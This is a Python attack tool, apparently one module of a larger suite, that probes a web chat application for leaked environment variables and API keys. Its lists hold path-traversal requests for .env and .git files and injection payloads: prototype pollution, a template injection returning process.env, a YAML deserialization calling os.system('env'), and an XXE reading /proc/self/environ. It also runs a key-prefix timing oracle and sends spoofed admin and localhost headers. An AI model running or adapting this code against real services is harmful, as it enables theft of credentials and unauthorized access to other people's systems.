"""
env_probe.py — Environment Variable & Stack Trace Leakage Probe
Attacks: path traversal, forced errors with verbose output, timing oracle,
         response diff analysis to infer key prefix/length.
"""
import sys, os, argparse, urllib.request, urllib.error, urllib.parse, json, time, re

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from vibe_core import VibeTool

TRAVERSAL_PATHS = [
    # Path traversal via URL
    "/api/chat/../../../.env",
    "/api/chat/../../env",
    "/%2e%2e%2f%2e%2e%2f.env",
    "/api/..%2F..%2F.env",
    "/api/%2e%2e/%2e%2e/.env",
    # Direct dotenv paths
    "/.env",
    "/.env.local",
    "/.env.production",
    "/.env.development",
    "/config/.env",
    "/src/.env",
    "/server/.env",
    # Node.js specific
    "/package.json",
    "/node_modules/.package-lock.json",
    # Common config leak paths
    "/config.json",
    "/config.js",
    "/settings.json",
    "/app.json",
    "/server.js",
    "/index.js",
    "/.git/config",
    "/.git/HEAD",
]

# Payloads that should trigger verbose error responses with stack traces
VERBOSE_ERROR_PAYLOADS = [
    # Trigger JSON parse error in a downstream service
    {"endpoint": "/api/chat", "body": b"not-json-at-all{{{", "ct": "application/json"},
    # Cause unhandled promise rejection
    {"endpoint": "/api/chat", "body": json.dumps({
        "model": "openai/gpt-oss-20b:free",
        "messages": [{"role": "user", "content": "x"}],
        "persona": "default",
        "__proto__": {"NODE_ENV": "development"},
    }).encode(), "ct": "application/json"},
    # Force template rendering error
    {"endpoint": "/api/chat", "body": json.dumps({
        "model": "openai/gpt-oss-20b:free",
        "messages": [{"role": "user", "content": "{{constructor.constructor('return process.env')()}}"}],
        "persona": "default",
    }).encode(), "ct": "application/json"},
    # YAML deserialization if any middleware accepts it
    {"endpoint": "/api/chat",
     "body": b"model: !!python/object/apply:os.system ['env']\nmessages: []\npersona: default",
     "ct": "application/x-yaml"},
    # XML with entity expansion
    {"endpoint": "/api/chat",
     "body": (b'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]>'
              b'<chat><model>&xxe;</model></chat>'),
     "ct": "application/xml"},
    # Oversized JSON to trigger memory error with env in trace
    {"endpoint": "/api/chat", "body": json.dumps({
        "model": "openai/gpt-oss-20b:free",
        "messages": [{"role": "user", "content": "A" * 100_000}],
        "persona": "x" * 100_000,
    }).encode(), "ct": "application/json"},
]

# Timing oracle: compare response times for valid vs invalid key scenarios
# A longer response to a valid key hint might indicate the key prefix is correct
KEY_PREFIXES = [
    "sk-or-v1-",
    "sk-or-",
    "sk-",
    "or-",
    "Bearer sk-or-",
]


class EnvProbe(VibeTool):
    def __init__(self):
        super().__init__("Env Probe", "Environment Variable & Stack Trace Leakage Probe")

    def _get(self, url, hdrs=None, timeout=5):
        try:
            req = urllib.request.Request(url)
            if hdrs:
                for h, v in hdrs.items():
                    req.add_header(h, v)
            r = urllib.request.urlopen(req, timeout=timeout)
            return r.status, r.read().decode(errors="replace"), dict(r.headers)
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode(errors="replace"), dict(e.headers)
        except Exception as ex:
            return 0, str(ex), {}

    def _post_raw(self, url, body, ct, timeout=10):
        try:
            req = urllib.request.Request(url, data=body, method="POST")
            req.add_header("Content-Type", ct)
            r = urllib.request.urlopen(req, timeout=timeout)
            return r.status, r.read().decode(errors="replace"), dict(r.headers)
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode(errors="replace"), dict(e.headers)
        except Exception as ex:
            return 0, str(ex), {}

    def _has_leak(self, text):
        indicators = [
            r"sk-or-[A-Za-z0-9\-_]{10,}",
            r"sk-[A-Za-z0-9]{10,}",
            "OPENROUTER_API_KEY",
            "process.env",
            "NODE_ENV=",
            "at Object.<anonymous>",
            "at Module._compile",
            "Error: Cannot",
            "UnhandledPromiseRejection",
            r"/home/\w+/",
            r"C:\\Users\\",
        ]
        for ind in indicators:
            if re.search(ind, text, re.IGNORECASE):
                return True
        return False

    def vector_traversal(self, base):
        self.log("=== TRAVERSAL: Path Traversal / Static File Leak ===")
        hits = 0
        for path in TRAVERSAL_PATHS:
            status, resp, hdrs = self._get(base + path)
            if status == 200 and len(resp) > 10:
                self.log(f"  [OPEN] {path} ({len(resp)}b): {resp[:150]}", "warn")
                if self._has_leak(resp):
                    self.log(f"  [ENV LEAK] {path}: {resp[:300]}", "hack")
                    hits += 1
            elif status not in (404, 405, 400, 0) and resp:
                self.log(f"  [{status}] {path}: {resp[:80]}")
                if self._has_leak(resp):
                    hits += 1
        return hits

    def vector_verbose_errors(self, base):
        self.log("=== ERRORS: Forced Verbose Error / Stack Trace Extraction ===")
        hits = 0
        for i, p in enumerate(VERBOSE_ERROR_PAYLOADS):
            status, resp, hdrs = self._post_raw(
                base + p["endpoint"], p["body"], p["ct"])
            has_leak = self._has_leak(resp)
            if has_leak:
                self.log(f"  [LEAK #{i}] {p['ct']}: {resp[:400]}", "hack")
                hits += 1
            elif status not in (404, 405):
                self.log(f"  [payload_{i}] {status}: {resp[:100]}")
        return hits

    def vector_header_leak(self, base):
        """Check if response headers reveal internal info."""
        self.log("=== HEADERS: Response Header Analysis ===")
        hits = 0
        endpoints = ["/api/chat", "/api/config", "/api/health", "/api/community/stream"]
        for path in endpoints:
            status, resp, hdrs = self._get(base + path)
            interesting = {k: v for k, v in hdrs.items() if any(
                kw in k.lower() for kw in ["x-", "server", "powered", "via", "key", "auth", "token"]
            )}
            if interesting:
                self.log(f"  [{path}] Interesting headers: {interesting}", "warn")
                for v in interesting.values():
                    if re.search(r"sk-[A-Za-z0-9]{10,}", str(v)):
                        self.log(f"  [HEADER KEY LEAK] {path}: {v}", "hack")
                        hits += 1
        return hits

    def vector_timing_oracle(self, base):
        """
        Timing oracle: if the app validates an X-OR-Key against the real key char-by-char
        (unlikely but possible), we can measure response time differences.
        Test: send requests with correct prefix vs garbage — compare latency.
        """
        self.log("=== TIMING: X-OR-Key Length/Prefix Oracle ===")

        def measure(key_val):
            payload = json.dumps({
                "model": "openai/gpt-oss-20b:free",
                "messages": [{"role": "user", "content": "ping"}],
                "persona": "default",
            }).encode()
            req = urllib.request.Request(base + "/api/chat", data=payload, method="POST")
            req.add_header("Content-Type", "application/json")
            if key_val:
                req.add_header("X-OR-Key", key_val)
            t0 = time.monotonic()
            try:
                r = urllib.request.urlopen(req, timeout=15)
                r.read()
            except Exception:
                pass
            return time.monotonic() - t0

        # Baseline (no override key)
        baseline = measure(None)
        self.log(f"  Baseline (no X-OR-Key): {baseline:.3f}s")

        results = {}
        for prefix in KEY_PREFIXES:
            t = measure(prefix + "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX")
            results[prefix] = t
            diff = t - baseline
            self.log(f"  X-OR-Key prefix '{prefix}': {t:.3f}s (diff {diff:+.3f}s)")

        fastest_prefix = min(results, key=results.get)
        slowest_prefix = max(results, key=results.get)
        spread = results[slowest_prefix] - results[fastest_prefix]

        if spread > 0.5:
            self.log(f"  [TIMING SIGNAL] Spread={spread:.3f}s — fastest prefix: '{fastest_prefix}'", "warn")
        else:
            self.log(f"  [no timing signal] spread={spread:.3f}s — constant-time validation likely")

        return 0

    def vector_diff_config(self, base):
        """
        Diff /api/config responses with various auth headers to find fields
        that only appear for privileged requests — could include key fragments.
        """
        self.log("=== DIFF: Config Response Privilege Escalation ===")

        auth_variants = [
            ("no auth",         {}),
            ("X-Admin-Secret",  {"X-Admin-Secret": "admin123"}),
            ("X-Internal",      {"X-Internal": "true", "X-Forwarded-For": "127.0.0.1"}),
            ("localhost origin", {"Origin": "http://localhost:3456",
                                  "X-Forwarded-For": "127.0.0.1",
                                  "X-Real-IP": "127.0.0.1"}),
            ("debug flag",       {"X-Debug": "1", "X-Trace": "1"}),
        ]

        responses = {}
        for label, hdrs in auth_variants:
            _, resp, _ = self._get(base + "/api/config", hdrs)
            try:
                responses[label] = set(json.loads(resp).keys())
            except Exception:
                responses[label] = set()
            self.log(f"  [{label}] fields: {responses[label]}")

        # find fields that appear only in some variants
        base_fields = responses.get("no auth", set())
        for label, fields in responses.items():
            extra = fields - base_fields
            if extra:
                self.log(f"  [NEW FIELDS with '{label}'] {extra}", "warn")

        return 0

    def run(self, url):
        self.banner()
        base = url.rstrip("/")
        total = 0

        total += self.vector_traversal(base)
        total += self.vector_verbose_errors(base)
        total += self.vector_header_leak(base)
        self.vector_timing_oracle(base)
        self.vector_diff_config(base)

        self.log("================================")
        if total:
            self.log(f"CRITICAL — {total} environment/stack leak(s) found!", "hack")
        else:
            self.log("No direct env leak found. Check logs for subtle signals.", "warn")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", required=True)
    args = parser.parse_args()
    EnvProbe().run(args.url)
